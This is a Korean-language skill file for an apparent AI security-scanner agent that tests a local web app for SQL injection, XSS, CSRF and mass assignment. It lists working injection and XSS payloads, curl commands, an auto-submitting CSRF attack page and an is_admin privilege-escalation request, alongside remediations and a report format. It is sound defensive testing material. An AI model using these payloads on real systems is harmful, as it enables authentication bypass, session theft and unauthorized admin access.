# Input Validation Scanner Agent (입력값 검증 스캐너)

입력데이터 검증 및 표현 취약점을 테스트하는 에이전트

---

## 역할

SQL Injection, XSS, CSRF 등 입력값 관련 취약점 탐지

---

## 대상 취약점

| 번호 | 취약점 | 현재 앱 존재 여부 |
|------|--------|------------------|
| 1 | SQL 삽입 | ✅ 존재 |
| 2 | XSS (크로스사이트 스크립트) | ✅ 존재 |
| 3 | CSRF (크로스사이트 요청 위조) | ✅ 존재 |
| 4 | Mass Assignment | ✅ 존재 |

---

## Skill 1: SQL Injection Test

### 대상
- 엔드포인트: `POST /login`
- 파라미터: `email`, `password`

### 테스트 페이로드
```
# 인증 우회
' OR '1'='1' --
' OR '1'='1' /*
admin'--
' OR 1=1--

# 에러 기반
'
''
' AND '1'='2
1' ORDER BY 1--

# 시간 기반 (Blind)
' AND SLEEP(5)--
' OR pg_sleep(5)--
```

### 테스트 명령

```bash
# 기본 인증 우회 테스트
curl -X POST http://localhost:3000/login \
  -d "email=' OR '1'='1' --&password=anything"

# 에러 기반 테스트
curl -X POST http://localhost:3000/login \
  -d "email='&password=test"

# 예상 결과: 로그인 성공 또는 SQL 에러 메시지
```

### 탐지 기준
- 인증 우회 성공 → **Critical**
- SQL 에러 메시지 노출 → **High**
- 응답 시간 차이 → Blind SQL Injection 가능

### 권장 조치
```
참조: SR1-1 DBMS 조회 및 결과 검증

1. PreparedStatement 사용
   User.where(email: params[:email], password: params[:password])

2. 입력값 검증
   - 특수문자 이스케이프
   - 화이트리스트 검증

3. 최소 권한 DB 계정 사용
```

---

## Skill 2: XSS Test (크로스사이트 스크립트)

### 대상
- 엔드포인트: `POST /users` (회원가입)
- 파라미터: `user[name]`
- 출력 위치: `GET /users` (회원목록)

### 테스트 페이로드
```html
# 기본 스크립트
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

# 이벤트 핸들러
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

# 속성 인젝션
"><script>alert('XSS')</script>
'><script>alert('XSS')</script>

# 인코딩 우회
<script>alert(String.fromCharCode(88,83,83))</script>
```

### 테스트 명령

```bash
# 1. XSS 페이로드로 회원가입
curl -X POST http://localhost:3000/users \
  -d "user[email]=xss@test.com" \
  -d "user[name]=<script>alert('XSS')</script>" \
  -d "user[password]=test123"

# 2. 로그인
curl -c cookies.txt -X POST http://localhost:3000/login \
  -d "email=xss@test.com&password=test123"

# 3. 회원목록에서 스크립트 실행 확인
curl -b cookies.txt http://localhost:3000/users
# 응답에 <script> 태그가 그대로 포함되면 취약
```

### 탐지 기준
- 스크립트 태그가 필터링 없이 출력됨 → **High (Stored XSS)**
- 입력값이 그대로 반영됨 → **Medium (Reflected XSS)**

### 권장 조치
```
참조: SR1-5 웹 서비스 요청 및 결과 검증

1. 출력 시 HTML 이스케이프
   <%= user.name %>  (O - Rails 기본)
   <%= raw user.name %>  (X - 취약)

2. Content-Security-Policy 헤더 설정
   Content-Security-Policy: script-src 'self'

3. 입력값 검증
   - HTML 태그 제거 또는 이스케이프
```

---

## Skill 3: CSRF Test (크로스사이트 요청 위조)

### 대상
- 엔드포인트: `POST /users`, `POST /login`
- CSRF 토큰 존재 여부 확인

### 테스트 방법

```bash
# 1. CSRF 토큰 확인
curl -s http://localhost:3000/signup | grep -i csrf
curl -s http://localhost:3000/signup | grep authenticity_token

# 결과: 토큰이 없으면 취약

# 2. 토큰 없이 요청 테스트
curl -X POST http://localhost:3000/users \
  -d "user[email]=csrf@test.com" \
  -d "user[name]=CSRF Test" \
  -d "user[password]=test123"

# 성공하면 CSRF 취약
```

### 외부 사이트 공격 시뮬레이션
```html
<!-- 공격자 사이트의 HTML -->
<html>
<body>
<form action="http://localhost:3000/users" method="POST" id="csrf-form">
  <input type="hidden" name="user[email]" value="attacker@evil.com">
  <input type="hidden" name="user[name]" value="Attacker">
  <input type="hidden" name="user[password]" value="hacked123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 탐지 기준
- CSRF 토큰 없음 → **Medium**
- 토큰 검증 안 함 → **Medium**

### 권장 조치
```
참조: SR1-6 웹 기반 중요 기능 수행 요청 유효성 검증

1. CSRF 토큰 구현 (Rails 기본 기능 활성화)
   protect_from_forgery with: :exception

2. SameSite 쿠키 속성 설정
   cookies[:session] = { value: '...', same_site: :strict }

3. Referer 헤더 검증
```

---

## Skill 4: Mass Assignment Test

### 대상
- 엔드포인트: `POST /users`
- 숨겨진 파라미터: `user[is_admin]`

### 테스트 명령

```bash
# is_admin 파라미터 추가하여 회원가입
curl -X POST http://localhost:3000/users \
  -d "user[email]=admin_hack@test.com" \
  -d "user[name]=Admin Hacker" \
  -d "user[password]=hack123" \
  -d "user[is_admin]=true"

# 로그인 후 회원목록에서 is_admin 값 확인
```

### 탐지 기준
- 허용되지 않은 파라미터가 저장됨 → **High**

### 권장 조치
```
참조: SR2-3 부적절한 인가

1. Strong Parameters 사용
   params.require(:user).permit(:email, :name, :password)
   # is_admin은 permit하지 않음

2. 화이트리스트 방식 적용
```

---

## 출력 형식

```json
{
  "scanner": "input_validation_scanner",
  "target": "http://localhost:3000",
  "vulnerabilities": [
    {
      "id": "VULN-001",
      "type": "SQL Injection",
      "severity": "Critical",
      "cvss": 9.8,
      "endpoint": "POST /login",
      "parameter": "email",
      "payload": "' OR '1'='1' --",
      "evidence": "로그인 성공",
      "remediation": "PreparedStatement 사용"
    },
    {
      "id": "VULN-002",
      "type": "Stored XSS",
      "severity": "High",
      "cvss": 7.5,
      "endpoint": "POST /users",
      "parameter": "user[name]",
      "payload": "<script>alert('XSS')</script>",
      "evidence": "스크립트 실행됨",
      "remediation": "HTML 이스케이프 적용"
    }
  ]
}
```
